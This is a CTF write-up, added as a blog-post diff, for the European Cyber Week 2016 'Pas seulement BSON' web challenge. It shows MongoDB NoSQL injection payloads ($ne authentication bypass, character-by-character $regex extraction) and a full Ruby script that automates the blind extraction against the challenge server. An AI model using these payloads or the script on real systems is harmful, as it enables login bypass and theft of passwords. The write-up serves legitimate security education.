@@ -1,0 +1,120 @@
+---
+layout: post
+title: "ECW - 100 - Pas seulement BSON - Web"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+date: 2016/11/06
+thumbnail: /images/security-265130_640.jpg
+---
+## Informations
+
+### Version
+
+| By    | Version | Comment
+| ---   | ---     | ---
+| noraj | 1.0     | Creation
+
+### CTF
+
+- **Name** : European Cyber Week CTF Quals 2016
+- **Website** : [challenge-ecw.fr](https://challenge-ecw.fr/)
+- **Type** : Online
+- **Format** : Jeopardy - Student
+
+### Description
+
+N.A.
+
+## Solution
+
+This is a [NoSQL injection][nosqlInjection] on the famous [MongoDB](https://www.mongodb.com/) with certain [PHP][phpRequestInjectionAttacks] at backend.
+
+[nosqlInjection]:https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+[phpRequestInjectionAttacks]:http://www.php.net/manual/en/mongo.security.php
+
+We used the [query operators](queryOperator) to perform the NoSQLi.
+
+[queryOperator]:https://docs.mongodb.com/manual/reference/operator/query/
+
+We tested the following payload in our script with the [ne][ne] query operator to confirm presence of the vulnerability:
+
+```
+password[$ne]=nosql&nonce=myNonce
+```
+
+[ne]:https://docs.mongodb.com/manual/reference/operator/query/ne/#op._S_ne
+
+Then we retrieved the password letter by letter with the [regex][regex] query operator of NoSQL.
+At the beginning the script uses the following paylods:
+
+```
+password[$regex]=ECW{.{32}}&nonce=myNonce
+password[$regex]=ECW{a.{31}}&nonce=myNonce
+password[$regex]=ECW{b.{31}}&nonce=myNonce
+password[$regex]=ECW{c.{31}}&nonce=myNonce
+[...]
+```
+
+[regex]:https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex
+
+Each bad request results in an authentification failure and when the right char is found with a succesful authentification, the script with try to find the next chars with something like:
+
+```
+password[$regex]=ECW{2.{31}}&nonce=myNonce
+password[$regex]=ECW{2a.{30}}&nonce=myNonce
+password[$regex]=ECW{2b.{30}}&nonce=myNonce
+password[$regex]=ECW{2c.{30}}&nonce=myNonce
+[...]
+```
+
+So here is our script that we adapted from the first web challenge *Authentification*.
+
+```ruby
+#!/usr/bin/env ruby
+
+require 'curb' # for get/post requests
+
+hostname = 'https://challenge-ecw.fr/chals/web200'
+nonce = 'myNonce'
+
+c = Curl::Easy.new(hostname) do |curl|
+  curl.headers['Cookie'] = 'session=mySessionCookie'
+  curl.headers['Referer'] = hostname
+  curl.headers['Host'] = 'challenge-ecw.fr'
+  curl.headers['Connection'] = 'keep-alive'
+  curl.headers['Upgrade-Insecure-Requests'] = '1'
+  #curl.verbose = true
+end # Curl
+c.perform # send the request
+
+if c.body_str.match(/Un nouveau m/)
+  puts '• Connexion to ECW works'
+end
+
+length = 32 # md5(hash)
+
+# Find each char of the password one by one
+answer = ""
+ECW_flag_alphabet_array = ('a'..'f').to_a + (0.to_s..9.to_s).to_a # md5(hash)
+(1..length).each do |offset|
+  ECW_flag_alphabet_array.each do |char|
+    c.http_post(Curl::PostField.content('password[$regex]', "ECW{#{answer}#{char}.{#{length - offset}}}"),
+                Curl::PostField.content('nonce', nonce))
+    c.perform
+    if c.body_str.match(/Authentification valide\. Le mot de passe est le flag\./)
+      answer.concat(char)
+      puts "Password: ECW{#{answer}}"
+      break
+    else
+      puts "Tried: ECW{#{answer}#{char}}"
+    end
+  end
+end
+```
